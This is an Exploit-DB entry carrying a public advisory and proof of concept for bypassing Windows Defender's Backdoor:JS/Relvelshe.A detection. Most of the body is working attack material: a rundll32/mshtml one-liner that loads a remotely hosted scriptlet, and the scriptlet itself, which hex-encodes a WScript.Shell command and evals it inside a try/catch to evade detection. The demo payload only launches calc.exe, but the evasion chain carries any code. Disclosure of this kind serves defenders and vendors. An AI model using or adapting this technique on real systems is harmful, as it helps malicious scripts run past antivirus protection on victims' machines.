{"source": "https://www.exploit-db.com/exploits/51801", "vulnName": "Microsoft Windows Defender Bypass - Detection Mitigation Bypass", "vulnEDBID": "51801", "vulnCVE": "N/A", "author": "HYP3RLINX", "exploitType": "LOCAL", "platform": "WINDOWS_X86-64", "datePublished": "2024-02-19", "vulnContent": "[+] Credits: John Page (aka hyp3rlinx)  \n[+] Website: hyp3rlinx.altervista.org\n[+] Source:  https://hyp3rlinx.altervista.org/advisories/Windows_Defender_Backdoor_JS.Relvelshe.A_Detection_Mitigation_Bypass.txt\n[+] twitter.com/hyp3rlinx\n[+] ISR: ApparitionSec     \n \n\n\n[Vendor]\nwww.microsoft.com\n\n\n[Product]\nWindows Defender\n\n\n[Vulnerability Type]\nDetection Mitigation Bypass \nBackdoor:JS/Relvelshe.A\n\n\n[CVE Reference]\nN/A\n\n\n[Security Issue]\nBack in 2022 I released a PoC to bypass the Backdoor:JS/Relvelshe.A detection in defender but it no longer works as was mitigated.\nHowever, adding a simple javascript try catch error statement and eval the hex string it executes as of the time of this post.\n\n\n[References]\nhttps://twitter.com/hyp3rlinx/status/1480657623947091968\n\n\n[Exploit/POC]\n1) python -m http.server 80\n\n2) Open command prompt as Administrator\n\n3) rundll32  javascript:\"\\\\..\\\\..\\\\mshtml\\\\..\\\\..\\\\mshtml,RunHTMLApplication ,RunHTMLApplication \";document.write();GetObject(\"script\"+\":\"+\"http://localhost/yo.tmp\")\n\nCreate file and host on server, this is contents of the \"yo.tmp\" file.\n\n<?xml version=\"1.0\"?>\n<component>\n<script>\ntry{\n<![CDATA[\nvar hex = \"6E657720416374697665584F626A6563742822575363726970742E5368656C6C22292E52756E282263616C632E6578652229\";\nvar str = '';\nfor (var n = 0; n < hex.length; n += 2) {\nstr += String.fromCharCode(parseInt(hex.substr(n, 2), 16));\n}\neval(str)\n]]>\n}catch(e){\neval(str)\n}\n</script>\n</component>\n\n\n[Network Access]\nLocal\n\n\n\n[Severity]\nHigh\n\n\n[Disclosure Timeline]\nVendor Notification:  \nFebruary 18, 2024: Public Disclosure\n\n\n\n[+] Disclaimer\nThe information contained within this advisory is supplied \"as-is\" with no warranties or guarantees of fitness of use or otherwise.\nPermission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and\nthat due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit\nis given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility\nfor any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information\nor exploits by the author or elsewhere. All content (c).\n\nhyp3rlinx\n            "}